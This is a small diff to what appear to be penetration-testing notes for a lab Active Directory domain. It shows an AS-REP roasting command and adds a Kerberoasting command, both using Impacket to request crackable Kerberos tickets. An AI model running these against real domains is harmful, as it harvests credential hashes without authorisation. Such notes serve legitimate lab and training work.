@@ -8,3 +8,8 @@ note that the domain must end in a /
 ```bash
 impacket-GetNPUsers -request -usersfile users -dc-ip $IP LAB.ENTERPRISE.THM/
 ```
+
+# kerberoast with impacket-GetUserSPNs
+```bash
+impacket-GetUserSPNs -dc-ip $IP -request LAB.ENTERPRISE.THM/username
+```
